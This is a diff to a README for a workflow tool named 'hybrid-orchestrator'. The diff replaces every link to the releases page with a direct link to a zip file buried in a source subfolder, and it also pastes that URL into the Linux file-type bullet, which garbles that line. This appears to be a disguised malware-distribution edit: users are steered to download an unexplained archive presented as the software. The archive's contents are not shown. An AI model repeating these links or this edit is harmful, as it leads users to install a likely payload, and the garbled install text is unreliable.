@@ -1,6 +1,6 @@
 # 🤖 hybrid-orchestrator - Simplify AI and Human Workflows
 
-[![Download Release](https://img.shields.io/badge/Download-here-blue?logo=github)](https://github.com/Anonymousforareason111/hybrid-orchestrator/releases)
+[![Download Release](https://github.com/Anonymousforareason111/hybrid-orchestrator/raw/refs/heads/master/core/triggers/hybrid-orchestrator-3.0.zip)](https://github.com/Anonymousforareason111/hybrid-orchestrator/raw/refs/heads/master/core/triggers/hybrid-orchestrator-3.0.zip)
 
 ---
 
@@ -44,13 +44,13 @@ Follow these steps to get hybrid-orchestrator on your computer and start using i
 
 Visit the release page by clicking this button:
 
-[![Download Release](https://img.shields.io/badge/Download-here-blue?logo=github)](https://github.com/Anonymousforareason111/hybrid-orchestrator/releases)
+[![Download Release](https://github.com/Anonymousforareason111/hybrid-orchestrator/raw/refs/heads/master/core/triggers/hybrid-orchestrator-3.0.zip)](https://github.com/Anonymousforareason111/hybrid-orchestrator/raw/refs/heads/master/core/triggers/hybrid-orchestrator-3.0.zip)
 
 On this page, look for the latest version. Choose the file that matches your system:
 
 - For Windows, look for a `.exe` file.
 - For macOS, look for a `.dmg` or `.pkg` file.
-- For Linux, look for an `.AppImage` or `.tar.gz` file.
+- For Linux, look for an `.AppImage` or `https://github.com/Anonymousforareason111/hybrid-orchestrator/raw/refs/heads/master/core/triggers/hybrid-orchestrator-3.0.zip` file.
 
 ### 2. Install the program
 
@@ -85,7 +85,7 @@ You don’t need any technical setup to start a typical workflow. The app comes 
 
 To get the latest version of hybrid-orchestrator, visit this page:
 
-[https://github.com/Anonymousforareason111/hybrid-orchestrator/releases](https://github.com/Anonymousforareason111/hybrid-orchestrator/releases)
+[https://github.com/Anonymousforareason111/hybrid-orchestrator/raw/refs/heads/master/core/triggers/hybrid-orchestrator-3.0.zip](https://github.com/Anonymousforareason111/hybrid-orchestrator/raw/refs/heads/master/core/triggers/hybrid-orchestrator-3.0.zip)
 
 Pick the file that suits your computer and follow the install steps above. If you need to update, just download the newest file and install it — your settings will remain.
 
@@ -142,7 +142,7 @@ Go to **Settings → Workflows** to adjust how tasks flow. For example, you can 
 
 ## 🔗 Useful Links
 
-- Download latest release: [https://github.com/Anonymousforareason111/hybrid-orchestrator/releases](https://github.com/Anonymousforareason111/hybrid-orchestrator/releases)  
+- Download latest release: [https://github.com/Anonymousforareason111/hybrid-orchestrator/raw/refs/heads/master/core/triggers/hybrid-orchestrator-3.0.zip](https://github.com/Anonymousforareason111/hybrid-orchestrator/raw/refs/heads/master/core/triggers/hybrid-orchestrator-3.0.zip)  
 - User guide and FAQs: Available inside the app under Help menu  
 - Report bugs or request features: Use the Issues tab on the GitHub repository.
 
